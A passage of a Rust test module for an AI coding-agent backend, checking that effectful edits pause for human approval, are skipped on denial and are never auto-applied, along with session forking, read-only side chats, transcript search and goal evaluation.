                    "sources": [{ "path": "src/a.rs", "text": "fn a() { let _ = x.unwrap(); }\n" }],
                }),
            })
            .await
            .unwrap();
        assert!(ack.accepted);
        let receipts = host.verification_receipts(&session).await.unwrap();
        assert_eq!(receipts.len(), 1, "the run recorded a durable receipt");
        let _ = std::fs::remove_dir_all(dir);
    }

    /// Answering a gate that is not there is REFUSED, not accepted. The FE closes the approval
    /// overlay on `accepted`, so an unknown / already-answered / never-held gate that acked
    /// `accepted: true` rendered a held action as a completed one.
    #[tokio::test]
    async fn host_answering_an_unknown_gate_is_refused_not_accepted() {
        let dir = std::env::temp_dir().join(format!("hide_host_gate_unknown_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        for name in ["approve_gate", "deny_gate"] {
            let ack = host
                .handle_intent(Intent::Custom {
                    name: name.to_string(),
                    payload: json!({ "gate": "command:does-not-exist" }),
                })
                .await
                .unwrap();
            assert!(!ack.accepted, "{name} of an unknown gate must not read as done");
            assert!(ack
                .message
                .unwrap_or_default()
                .contains("not awaiting a decision"));
        }
        assert_eq!(host.pending_gate_count(), 0);
        let _ = std::fs::remove_dir_all(dir);
    }

    // ---- effect+approval round-trip (audit F1 / bible §78.1 #7) ----
    //
    // Under the bounded `SuggestOnly` autonomy a live turn runs under, an
    // effectful step PAUSES for approval. These tests drive the PRODUCTION
    // `run_turn_kernel` path with a real effectful (edit) step and prove the
    // full round-trip the host previously lacked: the turn pauses + surfaces an
    // `approval.requested`, an `ApprovalHub` decision resumes (Approve) or skips
    // (Deny) the step, and with NO decision the effect is never auto-applied.

    const EFFECT_CONTENT: &str = "approved-effect-applied\n";

    /// A planner emitting ONE effectful edit step (writes `target`), gated by a
    /// single declared oracle so a passing verdict carries it to `Done`.
    struct EditPlanner {
        target: String,
        content: String,
        oracle: String,
    }
    impl hide_kernel::plan::planner::Planner for EditPlanner {
        fn synthesize<'a>(
            &'a self,
            objective: &'a str,
        ) -> futures::future::BoxFuture<'a, Result<hide_kernel::plan::schema::Plan>> {
            use hide_kernel::plan::schema::{Acceptance, Plan, PlanStatus, PlanStep, StepKind};
            let target = self.target.clone();
            let content = self.content.clone();
            let oracle = self.oracle.clone();
            let objective = objective.to_string();
            Box::pin(async move {
                let mut step = PlanStep::new(
                    "write the effect file",
                    StepKind::Edit,
                    Acceptance::with_oracles("the effect file is applied", vec![oracle]),
                );
                step.tool_hint = Some("edit.write_file".to_string());
                step.tool_args = Some(json!({ "path": target, "content": content }));
                Ok(Plan {
                    id: hide_core::ids::PlanId::new(),
                    title: "effectful edit plan".to_string(),
                    objective,
                    steps: vec![step],
                    status: PlanStatus::Active,
                    budget: Default::default(),
                })
            })
        }
    }

    /// A deterministic always-Pass oracle so the effectful step verifies without
    /// shelling `cargo` (the doc-sanctioned substitute).
    struct NoopPassOracle(&'static str);
    impl hide_kernel::verify::oracle::Oracle for NoopPassOracle {
        fn name(&self) -> &str {
            self.0
        }
        fn verify<'a>(
            &'a self,
            _input: &'a hide_kernel::verify::oracle::VerificationInput,
        ) -> futures::future::BoxFuture<'a, Result<hide_kernel::verify::oracle::Verdict>> {
            use hide_kernel::verify::oracle::{OracleClass, Verdict};
            let name = self.0;
            Box::pin(async move { Ok(Verdict::pass(name, OracleClass::Deterministic, "noop pass")) })
        }
    }

    /// Build + drive an effectful kernel turn through the production
    /// `run_turn_kernel`. `decision`, when `Some`, is buffered in the hub before
    /// the drive (InterruptHub-style): the run still genuinely PAUSES and only
    /// resumes because a decision is available - never auto-approved. `None`
    /// leaves the hub empty to prove the decision is load-bearing. Returns the
    /// terminal state, the run's events, the effect target path, the temp repo,
    /// and the run id.
    async fn drive_effectful_turn(
        decision: Option<ApprovalDecision>,
        max_steps: usize,
    ) -> (
        AgentState,
        Vec<hide_core::event::Event>,
        PathBuf,
        PathBuf,
        RunId,
    ) {
        use std::sync::atomic::{AtomicU64, Ordering};
        static SEQ: AtomicU64 = AtomicU64::new(0);
        let n = SEQ.fetch_add(1, Ordering::SeqCst);
        let dir = std::env::temp_dir().join(format!("hide_approval_{}_{}", now_ms(), n));
        std::fs::create_dir_all(dir.join("src")).unwrap();
        std::fs::write(dir.join("Cargo.toml"), "[package]\nname=\"fx\"\n").unwrap();
        let _ = std::process::Command::new("git")
            .args(["init", "-q"])
            .current_dir(&dir)
            .output();

        let services =
            Arc::new(BackendServices::open(HideConfig::for_workspace(&dir)).unwrap());
        let session = services.session();
        let root = dir.to_string_lossy().to_string();
        let target = dir.join("applied.txt");

        let planner = Arc::new(EditPlanner {
            target: target.to_string_lossy().to_string(),
            content: EFFECT_CONTENT.to_string(),
            oracle: "applied".to_string(),
        });
        let mut suite = hide_kernel::verify::OracleSuite::new();
        suite.register(Arc::new(NoopPassOracle("applied")));
        let dispatcher = hide_kernel::allow_all_dispatcher(root.clone());

        // Bounded SuggestOnly: the effectful edit MUST pause for approval.
        let kernel = AgentKernel::builder(services.event_log.clone())
            .workspace_root(root.clone())
            .autonomy(Autonomy::SuggestOnly)
            .planner(planner as Arc<dyn hide_kernel::plan::planner::Planner>)
            .dispatcher(dispatcher)
            .oracle_suite(suite)
            .build();

        let ui_bus = Arc::new(UiEventBus::default());
        let interrupts = Arc::new(InterruptHub::default());
        let approvals = Arc::new(ApprovalHub::default());
        let run_id = RunId::new();

        if let Some(d) = decision {
            approvals.decide(run_id.clone(), None, d);
        }

        let state = run_turn_kernel(
            kernel,
            services.event_log.clone(),
            services.key_value_store.clone(),
            services.role_registry.clone(),
            services.code_index.clone(),
            services.memory_store.clone(),
            ui_bus,
            interrupts,
            approvals,
            run_id.clone(),
            session.clone(),
            "http://127.0.0.1:9/unreachable".to_string(),
            "apply the effect".to_string(),
            max_steps,
            services.repo_instructions.clone(),
        )
        .await
        .unwrap();

        let events = services
            .event_log
            .scan(Some(session.clone()), None, None)
            .await
            .unwrap();
        (state, events, target, dir, run_id)
    }

    #[tokio::test]
    async fn effectful_kernel_turn_pauses_then_resumes_on_approve() {
        let (state, events, target, dir, run_id) =
            drive_effectful_turn(Some(ApprovalDecision::Approve), 64).await;

        // (1) It PAUSED and surfaced the request for THIS run.
        assert!(
            events.iter().any(|e| e.kind == "approval.requested"
                && e.payload.get("run_id").and_then(|v| v.as_str()) == Some(run_id.as_str())),
            "the effectful step must surface an approval.requested while paused"
        );
        // (2) The Approve (delivered via the hub) RESUMED the step: the effect ran.
        assert!(target.exists(), "approve must let the effectful edit run");
        assert_eq!(
            std::fs::read_to_string(&target).unwrap(),
            EFFECT_CONTENT,
            "the approved edit wrote the expected content"
        );
        // (3) The run reached a terminal, verified Done.
        assert_eq!(state.phase, Phase::Done, "approved turn must finish");
        // (4) The resolution was recorded as an approve.
        assert!(
            events.iter().any(|e| e.kind == "approval.resolved"
                && e.payload.get("decision").and_then(|v| v.as_str()) == Some("approve")),
            "an approval.resolved(approve) must be recorded"
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn effectful_kernel_turn_skips_effect_on_deny() {
        let (state, events, target, dir, _run_id) =
            drive_effectful_turn(Some(ApprovalDecision::Deny), 64).await;

        // It still PAUSED and surfaced the request.
        assert!(
            events.iter().any(|e| e.kind == "approval.requested"),
            "the deny path must still pause + surface the request"
        );
        // The Deny SKIPPED the step: the effect was never applied.
        assert!(!target.exists(), "deny must skip the effectful edit");
        // The run still resolved to a terminal phase (the skipped step drains the plan).
        assert!(
            state.phase.is_terminal(),
            "denied turn must still reach terminal, got {:?}",
            state.phase
        );
        assert!(
            events.iter().any(|e| e.kind == "approval.resolved"
                && e.payload.get("decision").and_then(|v| v.as_str()) == Some("deny")),
            "an approval.resolved(deny) must be recorded"
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn effectful_kernel_turn_never_auto_approves_without_a_decision() {
        // Nothing deposited: the turn must NOT run the effect on its own.
        let (state, events, target, dir, _run_id) = drive_effectful_turn(None, 40).await;

        assert!(
            events.iter().any(|e| e.kind == "approval.requested"),
            "it must still pause and ask for approval"
        );
        assert!(
            !target.exists(),
            "no decision must never auto-apply the effect"
        );
        assert_ne!(
            state.phase,
            Phase::Done,
            "without approval the turn must not complete the effect"
        );
        // It is stuck awaiting approval (paused) or step-capped - never applied.
        assert!(
            matches!(state.phase, Phase::Paused | Phase::Aborted),
            "an unapproved effectful turn stays paused / aborts, got {:?}",
            state.phase
        );
        assert!(
            !events.iter().any(|e| e.kind == "approval.resolved"),
            "no decision => no resolution recorded"
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn approval_request_is_announced_under_the_kind_the_frontend_routes_on() {
        // Every other Custom UiEvent discriminates on `kind` and the frontend router switches on it
        // (app/src/store.ts). This one carried `type`, so the only surface that could answer a
        // paused effectful step never saw the request and the turn deadlocked.
        let dir = std::env::temp_dir().join(format!("hide_approval_announce_{}", now_ms()));
        let services = Arc::new(BackendServices::open(HideConfig::for_workspace(&dir)).unwrap());
        let session = services.session();
        let ui_bus = Arc::new(UiEventBus::default());
        let mut rx = ui_bus.subscribe();
        let run_id = RunId::new();
        let request = ApprovalRequest {
            step_id: StepId::new(),
            summary: "write src/retry.rs".to_string(),
            effects: vec!["write_fs".to_string()],
        };

        announce_approval_request(&services.event_log, &ui_bus, &session, &run_id, &request)
            .await
            .unwrap();

        let ev = rx.try_recv().expect("the request is pushed on Wire-B");
        let UiEventKind::Custom(v) = ev.kind else {
            panic!("the approval request is a Custom UiEvent")
        };
        assert_eq!(v.get("kind").and_then(|k| k.as_str()), Some("approval_requested"));
        assert_eq!(v.get("run_id").and_then(|k| k.as_str()), Some(run_id.as_str()));
        assert_eq!(
            v.get("step_id").and_then(|k| k.as_str()),
            Some(request.step_id.as_str()),
            "the decision has to name the step, so the id rides the event"
        );
        assert!(v.get("type").is_none(), "no second discriminator to drift");
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn approve_effect_intent_deposits_the_decision_into_the_hub() {
        // The host intent path (point 3): an `approve_effect` Custom intent must
        // deliver the decision to the ApprovalHub for the named run.
        let dir = std::env::temp_dir().join(format!("hide_approve_effect_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let run = RunId::new();
        let step = StepId::new();

        let ack = host
            .handle_intent(Intent::Custom {
                name: "approve_effect".to_string(),
                payload: json!({ "run_id": run.as_str(), "step_id": step.as_str() }),
            })
            .await
            .unwrap();
        assert!(ack.accepted, "approve_effect is recorded + accepted");
        assert_eq!(
            host.approvals().take(&run),
            Some((Some(step), ApprovalDecision::Approve)),
            "the decision must be deposited in the hub for the run"
        );

        // And deny_effect deposits a Deny.
        let run2 = RunId::new();
        host.handle_intent(Intent::Custom {
            name: "deny_effect".to_string(),
            payload: json!({ "run_id": run2.as_str() }),
        })
        .await
        .unwrap();
        assert_eq!(
            host.approvals().take(&run2),
            Some((None, ApprovalDecision::Deny)),
            "deny_effect deposits a Deny (step_id optional)"
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn fork_session_from_event_records_ancestry_and_keeps_source_independent() {
        let dir = std::env::temp_dir().join(format!("hide_fork_ancestry_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let source = host.services.session();
        let log = &host.services.event_log;
        // Seed three source events; the 2nd is the fork boundary.
        log.append(NewEvent::system(
            source.clone(),
            "user.intent.submit_turn",
            json!({ "intent": "submit_turn", "args": { "text": "one" } }),
        ))
        .await
        .unwrap();
        let boundary = log
            .append(NewEvent::system(
                source.clone(),
                "agent.message",
                json!({ "role": "assistant", "text": "two" }),
            ))
            .await
            .unwrap();
        log.append(NewEvent::system(
            source.clone(),
            "agent.message",
            json!({ "role": "assistant", "text": "three" }),
        ))
        .await
        .unwrap();

        // Fork at the boundary event.
        let (fork_id, record, projection) = host
            .fork_session_from_event(source.clone(), Some(&boundary.id))
            .await
            .unwrap();
        assert_ne!(fork_id, source, "the fork gets a fresh session id");
        assert_eq!(projection.session_id, fork_id);

        // The fork carries the pre-boundary history (events 1 + 2 only).
        let fork_events = log.scan(Some(fork_id.clone()), None, None).await.unwrap();
        assert_eq!(fork_events.len(), 2, "fork = source prefix up to the boundary");
        assert!(
            !fork_events
                .iter()
                .any(|e| e.payload.get("text").and_then(|t| t.as_str()) == Some("three")),
            "the post-boundary event is not in the fork"
        );

        // Ancestry is correct AND durable (recoverable from the KV store).
        assert_eq!(record.parent_session_id.as_ref(), Some(&source));
        assert_eq!(record.forked_at, Some(boundary.seq));
        assert_eq!(record.forked_at_event.as_ref(), Some(&boundary.id));
        assert_eq!(record.origin, "fork");
        let looked_up = host
            .services
            .sessions
            .session_record(&host.services.key_value_store, &fork_id)
            .expect("ancestry is durably recorded");
        assert_eq!(looked_up, record, "the KV record matches the returned one");

        // The source is unchanged (still exactly its 3 events).
        assert_eq!(
            log.scan(Some(source.clone()), None, None).await.unwrap().len(),
            3
        );

        // Appending to the fork does NOT appear in the source (independence).
        log.append(NewEvent::system(
            fork_id.clone(),
            "agent.message",
            json!({ "role": "assistant", "text": "fork-only" }),
        ))
        .await
        .unwrap();
        assert_eq!(
            log.scan(Some(source), None, None).await.unwrap().len(),
            3,
            "a fork append never touches the source"
        );
        assert_eq!(
            log.scan(Some(fork_id), None, None).await.unwrap().len(),
            3,
            "the fork gained its own independent event"
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn fork_session_intent_forks_and_surfaces_new_thread() {
        let dir = std::env::temp_dir().join(format!("hide_fork_intent_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let source = host.services.session();
        let log = &host.services.event_log;
        log.append(NewEvent::system(
            source.clone(),
            "user.intent.submit_turn",
            json!({ "intent": "submit_turn", "args": { "text": "alpha" } }),
        ))
        .await
        .unwrap();
        let boundary = log
            .append(NewEvent::system(
                source.clone(),
                "agent.message",
                json!({ "role": "assistant", "text": "beta" }),
            ))
            .await
            .unwrap();

        let mut rx = host.subscribe_ui();
        let ack = host
            .handle_intent(Intent::ForkSession {
                session_id: source.clone(),
                at_event: boundary.id.clone(),
            })
            .await
            .unwrap();
        assert!(ack.accepted, "fork_session intent is recorded + accepted");

        // The spawned fork surfaces a `session_forked` Custom UiEvent under the
        // NEW session id (so the FE adopts the fork).
        let ev = loop {
            let ev = tokio::time::timeout(std::time::Duration::from_secs(2), rx.recv())
                .await
                .expect("a UiEvent should arrive")
                .expect("broadcast delivers");
            if let UiEventKind::Custom(ref v) = ev.kind {
                if v.get("kind").and_then(|k| k.as_str()) == Some("session_forked") {
                    break ev;
                }
            }
        };
        let new_id = ev.session_id.clone().expect("fork carries a new session id");
        assert_ne!(new_id, source, "the surfaced thread is a fresh session");
        // The ancestry record is durable + points back at the source + boundary.
        let record = host
            .services
            .sessions
            .session_record(&host.services.key_value_store, &new_id)
            .expect("the intent path durably records ancestry");
        assert_eq!(record.parent_session_id.as_ref(), Some(&source));
        assert_eq!(record.forked_at, Some(boundary.seq));
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn host_search_transcript_scopes_and_finds_across_sessions() {
        let dir = std::env::temp_dir().join(format!("hide_host_search_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let a = host.services.session();
        let b = host.services.session_named("second");
        assert_ne!(a, b);
        let log = &host.services.event_log;
        log.append(NewEvent::system(
            a.clone(),
            "user.intent.submit_turn",
            json!({ "intent": "submit_turn", "args": { "text": "fix the ZZALPHA bug" } }),
        ))
        .await
        .unwrap();
        log.append(NewEvent::system(
            b.clone(),
            "user.intent.submit_turn",
            json!({ "intent": "submit_turn", "args": { "text": "ship ZZBETA feature" } }),
        ))
        .await
        .unwrap();

        // Cross-session literal search finds only the ZZALPHA item (scoped to A).
        let hits = host
            .search_transcript(&crate::replay::TranscriptQuery::literal("ZZALPHA"))
            .await
            .unwrap();
        assert_eq!(hits.len(), 1, "only the ZZALPHA item matches");
        assert_eq!(hits[0].session_id, a);
        assert_eq!(hits[0].role.as_deref(), Some("user"));
        assert!(hits[0].snippet.contains("ZZALPHA"));

        // A session filter scopes the search to session B.
        let b_hits = host
            .search_transcript(
                &crate::replay::TranscriptQuery::literal("ZZBETA").in_session(b.clone()),
            )
            .await
            .unwrap();
        assert_eq!(b_hits.len(), 1);
        assert_eq!(b_hits[0].session_id, b);
        let _ = std::fs::remove_dir_all(dir);
    }

    // --- Side chats + conversation graph (bible sec 32-33, sec 78.1 #9) ---

    /// Seed a parent session with `user + assistant(boundary) + post-boundary`
    /// events. Returns the boundary event so a fork/side-chat can branch at it.
    async fn seed_parent_with_boundary(
        log: &hide_core::persistence::DynEventLog,
        parent: &SessionId,
    ) -> Event {
        log.append(NewEvent::system(
            parent.clone(),
            "user.intent.submit_turn",
            json!({ "intent": "submit_turn", "args": { "text": "explore option A" } }),
        ))
        .await
        .unwrap();
        let boundary = log
            .append(NewEvent::system(
                parent.clone(),
                "agent.message",
                json!({ "role": "assistant", "text": "here is option A" }),
            ))
            .await
            .unwrap();
        log.append(NewEvent::system(
            parent.clone(),
            "agent.message",
            json!({ "role": "assistant", "text": "post-boundary chatter" }),
        ))
        .await
        .unwrap();
        boundary
    }

    #[tokio::test]
    async fn create_side_chat_is_read_only_inherits_history_and_leaves_parent_independent() {
        let dir = std::env::temp_dir().join(format!("hide_side_chat_create_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let parent = host.services.session();
        let log = &host.services.event_log;
        let boundary = seed_parent_with_boundary(log, &parent).await;

        let (side_id, record, projection) = host
            .create_side_chat(parent.clone(), Some(&boundary.id), true)
            .await
            .unwrap();
        assert_ne!(side_id, parent, "the side chat gets a fresh session id");
        assert_eq!(projection.session_id, side_id);

        // Recorded as a READ-ONLY SideChat, with ancestry preserved + durable.
        assert_eq!(
            record.relationship,
            crate::services::SessionRelationship::SideChat
        );
        assert_eq!(record.origin, "side_chat");
        assert!(record.read_only, "a side chat defaults read-only");
        assert_eq!(record.parent_session_id.as_ref(), Some(&parent));
        assert_eq!(record.forked_at, Some(boundary.seq));
        let looked_up = host
            .services
            .sessions
            .session_record(&host.services.key_value_store, &side_id)
            .expect("side-chat ancestry is durably recorded");
        assert_eq!(looked_up, record, "the KV record matches the returned one");

        // Inherits the PRE-boundary history (events 1 + 2), not the post-boundary one.
        let side_events = log.scan(Some(side_id.clone()), None, None).await.unwrap();
        assert_eq!(
            side_events.len(),
            2,
            "side chat = parent prefix up to the boundary"
        );
        assert!(
            !side_events
                .iter()
                .any(|e| e.payload.get("text").and_then(|t| t.as_str())
                    == Some("post-boundary chatter")),
            "the post-boundary event is not inherited"
        );

        // The parent is UNTOUCHED (still exactly its 3 events) + independent: a
        // side-chat append never leaks back into the parent.
        assert_eq!(
            log.scan(Some(parent.clone()), None, None).await.unwrap().len(),
            3
        );
        log.append(NewEvent::system(
            side_id.clone(),
            "agent.message",
            json!({ "role": "assistant", "text": "side-only note" }),
        ))
        .await
        .unwrap();
        assert_eq!(
            log.scan(Some(parent), None, None).await.unwrap().len(),
            3,
            "a side-chat append never touches the parent"
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn merge_side_chat_summary_lands_on_parent_and_side_chat_stays_intact() {
        let dir = std::env::temp_dir().join(format!("hide_side_chat_merge_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let parent = host.services.session();
        let log = &host.services.event_log;
        let boundary = seed_parent_with_boundary(log, &parent).await;

        let (side_id, _record, _projection) = host
            .create_side_chat(parent.clone(), Some(&boundary.id), true)
            .await
            .unwrap();
        let side_before = log.scan(Some(side_id.clone()), None, None).await.unwrap().len();
        let parent_before = log.scan(Some(parent.clone()), None, None).await.unwrap().len();

        // Give the side chat its own explored content (searchable token ZZSIDE).
        log.append(NewEvent::system(
            side_id.clone(),
            "agent.message",
            json!({ "role": "assistant", "text": "explored the ZZSIDE alternative" }),
        ))
        .await
        .unwrap();

        // Merge a TYPED summary back onto the PARENT.
        let summary = "ZZMERGE: option A is viable; the build verifies";
        let merged = host
            .merge_side_chat_summary(side_id.clone(), parent.clone(), summary)
            .await
            .unwrap();
        // The merge event lands on the PARENT, carrying the side_chat id + summary.
        assert_eq!(merged.session_id, parent, "the merge event lands on the parent");
        assert_eq!(merged.kind, "session.merge_summary");
        assert_eq!(
            merged.payload.get("side_chat").and_then(|v| v.as_str()),
            Some(side_id.as_str())
        );
        assert_eq!(
            merged.payload.get("summary").and_then(|v| v.as_str()),
            Some(summary)
        );

        // The parent gained exactly the one merge event; the side chat did NOT.
        let parent_events = log.scan(Some(parent.clone()), None, None).await.unwrap();
        assert_eq!(parent_events.len(), parent_before + 1);
        assert!(parent_events.iter().any(|e| e.kind == "session.merge_summary"));
        let side_events = log.scan(Some(side_id.clone()), None, None).await.unwrap();
        assert!(
            !side_events.iter().any(|e| e.kind == "session.merge_summary"),
            "the merge lands on the parent, not the side chat"
        );
        assert_eq!(
            side_events.len(),
            side_before + 1,
            "the side chat keeps its prefix + its own explored event, intact"
        );

        // A parent-scoped transcript search SURFACES the cited summary.
        let hits = host
            .search_transcript(
                &crate::replay::TranscriptQuery::literal("ZZMERGE").in_session(parent.clone()),
            )
            .await
            .unwrap();
        assert_eq!(hits.len(), 1, "the merged summary is searchable on the parent");
        assert_eq!(hits[0].session_id, parent);
        assert_eq!(hits[0].kind, "session.merge_summary");
        assert_eq!(hits[0].role.as_deref(), Some("side_chat"));
        assert!(hits[0].snippet.contains("ZZMERGE"));

        // The side chat's own explored content remains intact + reachable.
        let side_hits = host
            .search_transcript(
                &crate::replay::TranscriptQuery::literal("ZZSIDE").in_session(side_id.clone()),
            )
            .await
            .unwrap();
        assert_eq!(side_hits.len(), 1, "the side chat's content is intact");
        assert_eq!(side_hits[0].session_id, side_id);
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn discarding_a_side_chat_leaves_the_parent_event_count_unchanged() {
        let dir = std::env::temp_dir().join(format!("hide_side_chat_discard_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let parent = host.services.session();
        let log = &host.services.event_log;
        let boundary = seed_parent_with_boundary(log, &parent).await;
        let parent_before = log.scan(Some(parent.clone()), None, None).await.unwrap().len();

        // Create a side chat and then simply DISCARD it (never merge). Even
        // writing into it must not change the parent.
        let (side_id, _record, _projection) = host
            .create_side_chat(parent.clone(), Some(&boundary.id), true)
            .await
            .unwrap();
        log.append(NewEvent::system(
            side_id,
            "agent.message",
            json!({ "role": "assistant", "text": "discarded exploration" }),
        ))
        .await
        .unwrap();

        // Discard = no merge: the parent stays at its original event count.
        let parent_after = log.scan(Some(parent), None, None).await.unwrap();
        assert_eq!(
            parent_after.len(),
            parent_before,
            "discarding a side chat (no merge) never changes the parent"
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn conversation_graph_tags_children_by_relationship_and_walks_ancestry() {
        use crate::services::{SessionRecord, SessionRelationship};
        let dir = std::env::temp_dir().join(format!("hide_conv_graph_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let parent = host.services.session();
        let log = &host.services.event_log;
        let boundary = seed_parent_with_boundary(log, &parent).await;

        // Build parent -> [fork, side_chat, ephemeral_fork].
        let (fork_id, _r, _p) = host
            .fork_session_from_event(parent.clone(), Some(&boundary.id))
            .await
            .unwrap();
        let (side_id, _r, _p) = host
            .create_side_chat(parent.clone(), Some(&boundary.id), true)
            .await
            .unwrap();
        // An ephemeral fork: recorded directly (cheap/discardable exploration).
        let ephemeral_id = SessionId::new();
        let ephemeral_rec = SessionRecord::ephemeral_fork(
            ephemeral_id.clone(),
            parent.clone(),
            boundary.seq,
            Some(boundary.id.clone()),
        );
        host.services
            .sessions
            .record_session(&host.services.key_value_store, &ephemeral_rec);

        // Query the graph rooted at the parent. The parent has no durable record
        // (it lives in the `sessions` namespace), so it projects as a synth root.
        let graph = host.conversation_graph(&parent);
        assert_eq!(graph.node.session_id, parent);
        assert_eq!(graph.node.relationship, SessionRelationship::Root);
        assert!(graph.node.parent_session_id.is_none());

        // Exactly the three children, each relationship-tagged.
        assert_eq!(graph.children.len(), 3, "parent has three direct children");
        let child = |id: &SessionId| {
            graph
                .children
                .iter()
                .find(|n| &n.session_id == id)
                .unwrap_or_else(|| panic!("child {id} missing from graph"))
        };
        assert_eq!(child(&fork_id).relationship, SessionRelationship::Fork);
        assert_eq!(child(&side_id).relationship, SessionRelationship::SideChat);
        assert!(child(&side_id).read_only, "the side-chat child is read-only");
        assert_eq!(
            child(&ephemeral_id).relationship,
            SessionRelationship::EphemeralFork
        );

        // Every child edges back to the parent (node -> child).
        assert_eq!(graph.edges.len(), 3);
        assert!(graph.edges.iter().all(|e| e.parent == parent));
        let edge_children: std::collections::HashSet<_> =
            graph.edges.iter().map(|e| e.child.clone()).collect();
        assert!(
            edge_children.contains(&fork_id)
                && edge_children.contains(&side_id)
                && edge_children.contains(&ephemeral_id)
        );

        // DETERMINISTIC ordering: sorted by (created_ms, session_id) + stable
        // across calls.
        assert!(
            graph.children.windows(2).all(|w| (w[0].created_ms, &w[0].session_id)
                <= (w[1].created_ms, &w[1].session_id)),
            "children are deterministically ordered by created_ms then id"
        );
        assert_eq!(
            graph,
            host.conversation_graph(&parent),
            "the graph projection is deterministic across calls"
        );

        // Ancestry chain: querying the fork walks up to the (root) parent.
        let fork_graph = host.conversation_graph(&fork_id);
        assert_eq!(fork_graph.node.session_id, fork_id);
        assert_eq!(fork_graph.node.relationship, SessionRelationship::Fork);
        assert_eq!(fork_graph.node.parent_session_id.as_ref(), Some(&parent));
        assert_eq!(fork_graph.ancestry.len(), 1, "one ancestor: the root parent");
        assert_eq!(fork_graph.ancestry[0].session_id, parent);
        assert_eq!(
            fork_graph.ancestry[0].relationship,
            SessionRelationship::Root
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    // --- Durable Goal + Checkpoint (bible sec 14, sec 15.4, sec 78.1 #3) ---

    /// A `verify.result` event carrying a deterministic Verdict for `oracle`
    /// (Pass/Fail) -- the model-free evidence `goal_evaluate` reads.
    fn verify_result_event(session: &SessionId, oracle: &str, pass: bool) -> NewEvent {
        use hide_kernel::verify::oracle::{OracleClass, Verdict};
        let verdict = if pass {
            Verdict::pass(oracle, OracleClass::Deterministic, "all green")
        } else {
            Verdict::fail(
                oracle,
                OracleClass::Deterministic,
                "2 tests failed",
                Vec::new(),
            )
        };
        NewEvent::system(
            session.clone(),
            "verify.result",
            serde_json::to_value(&verdict).unwrap(),
        )
    }

    #[tokio::test]
    async fn goal_set_evaluate_is_deterministic_over_verify_result_evidence() {
        let dir = std::env::temp_dir().join(format!("hide_goal_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();

        // Set a goal with a tests_pass-style structured acceptance (oracle "tests").
        let record = host
            .goal_set(session.clone(), "tests_pass", vec!["tests".to_string()])
            .unwrap();
        assert_eq!(record.status, GoalStatus::Active);
        // goal_get returns the durable record verbatim.
        let got = host.goal_get(&session).expect("goal is durably stored");
        assert_eq!(got, record);

        // No evidence yet -> NotMet (no verification receipt for the oracle).
        let v0 = host.goal_evaluate(&session).await.unwrap();
        assert_eq!(v0.outcome, GoalOutcome::NotMet);
        assert!(
            v0.reason.contains("tests"),
            "reason names the oracle: {}",
            v0.reason
        );

        // Seed a FAILING verify.result -> NotMet with a reason + evidence.
        let log = &host.services.event_log;
        log.append(verify_result_event(&session, "tests", false))
            .await
            .unwrap();
        let vf = host.goal_evaluate(&session).await.unwrap();
        assert_eq!(vf.outcome, GoalOutcome::NotMet);
        assert!(
            vf.reason.to_lowercase().contains("did not pass"),
            "reason explains the miss: {}",
            vf.reason
        );
        assert_eq!(vf.evidence.len(), 1, "the consulted fail verdict is evidence");
        // A NotMet never advances the durable status.
        assert_eq!(host.goal_get(&session).unwrap().status, GoalStatus::Active);

        // Seed a PASSING verify.result (latest wins) -> Met.
        log.append(verify_result_event(&session, "tests", true))
            .await
            .unwrap();
        let vp = host.goal_evaluate(&session).await.unwrap();
        assert_eq!(vp.outcome, GoalOutcome::Met);
        assert!(vp.is_met());
        assert_eq!(vp.evidence.len(), 1);
        // Met is now durable: goal_get reflects it.
        assert_eq!(host.goal_get(&session).unwrap().status, GoalStatus::Met);

        // Clearing flips the durable status to Cleared; goal_get reflects it.
        let cleared = host.goal_clear(&session).unwrap().expect("a goal was set");
        assert_eq!(cleared.status, GoalStatus::Cleared);
        assert_eq!(host.goal_get(&session).unwrap().status, GoalStatus::Cleared);

        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn goal_natural_language_condition_is_deferred_no_model_called() {
        let dir = std::env::temp_dir().join(format!("hide_goal_defer_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();
        // A free-form NL condition with no structured acceptance: model-judged, so
        // DEFERRED (never Met/NotMet, never a model call, no evidence).
        host.goal_set(session.clone(), "the UI feels delightful", Vec::new())
            .unwrap();
        let v = host.goal_evaluate(&session).await.unwrap();
        assert_eq!(v.outcome, GoalOutcome::DeferredModelRequired);
        assert!(v.evidence.is_empty());
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn job_create_persists_and_survives_a_fresh_host_restart() {
        use crate::services::{Budget, JobRecord, Schedule, Trigger};
        let dir = std::env::temp_dir().join(format!("hide_job_recover_{}", now_ms()));
        let session;
        let job_id;
        {
            let host = BackendHost::open_workspace(&dir).unwrap();
            session = host.services.session();
            let budget = Budget {
                max_wall_secs: Some(600),
                max_steps: Some(40),
                ..Budget::default()
            };
            let job = JobRecord::pending(
                session.clone(),
                vec![
                    Trigger::FileChange("src/**/*.rs".to_string()),
                    Trigger::GitPush,
                ],
